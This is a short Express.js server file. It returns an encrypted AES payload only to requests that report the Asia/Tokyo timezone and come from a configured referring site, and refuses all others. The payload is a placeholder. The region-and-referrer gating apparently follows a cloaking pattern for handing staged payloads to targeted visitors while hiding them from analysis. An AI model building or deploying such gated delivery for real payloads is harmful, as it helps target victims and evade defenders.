const express = require('express');
const app = express();
const cors = require('cors');

app.use(cors());
app.use(express.json());

const ALLOWED_TIMEZONE = 'Asia/Tokyo';
const ALLOWED_URL = 'https://your-main-site.com'; // Replace with your main site URL

app.post('/', (req, res) => {
  const { timezone, fullUrl } = req.body;

  if (timezone !== ALLOWED_TIMEZONE) {
    return res.status(403).send('Forbidden: Timezone mismatch');
  }

  if (!fullUrl || !fullUrl.startsWith(ALLOWED_URL)) {
    return res.status(403).send('Forbidden: Referrer mismatch');
  }

  // Encrypted AES payload (replace this with your actual encrypted data)
  const encryptedPayload = 'U2FsdGVkX1+8EXAMPLEENCRYPTEDPAYLOADHERE==';
  res.send(encryptedPayload);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));